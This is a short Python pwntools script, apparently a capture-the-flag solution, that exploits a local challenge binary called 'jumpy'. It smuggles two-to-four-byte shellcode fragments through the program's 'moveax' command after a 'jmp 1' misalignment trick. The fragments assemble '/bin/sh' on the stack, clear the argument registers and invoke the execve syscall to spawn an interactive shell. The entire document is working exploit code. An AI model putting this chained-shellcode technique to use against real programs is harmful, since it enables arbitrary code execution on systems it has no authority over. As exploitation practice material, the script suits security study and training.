from pwn import *

context(os='linux', arch='amd64')
context.terminal = ['tmux','sp','-h']
context.log_level = 'debug'

p = process('./jumpy')
 
def message(data):
  p.sendlineafter("> ", "jmp 1")
  p.sendlineafter("> ", "moveax 184")
  p.sendlineafter("> ", "moveax " + str(u32(data)))
# gdb.attach(s)
# raw_input()

# push /bin/sh in stack
message(asm('''mov bx, 0x68'''))
message(asm('''shl rbx, 16'''))
message(asm('''mov bx, 0x732f'''))
message(asm('''shl rbx, 16'''))
message(asm('''mov bx, 0x6e69'''))
message(asm('''shl rbx, 16'''))
message(asm('''mov bx, 0x622f'''))
message(asm('''push rbx; mov rdi, rsp'''))

# rsi = 0; rdx = 0
message(asm('''xor rsi, rsi; nop'''))
message(asm('''push rsi; pop rdx; nop; nop'''))

# rax = 0x3b
# syscall('/bin/sh',0,0)
message(asm('''xor rbx, rbx; nop'''))
message(asm('''add rbx, 0x3b'''))
message(asm('''push rbx; pop rax; syscall'''))

p.sendlineafter("> ", "a")

p.interactive()
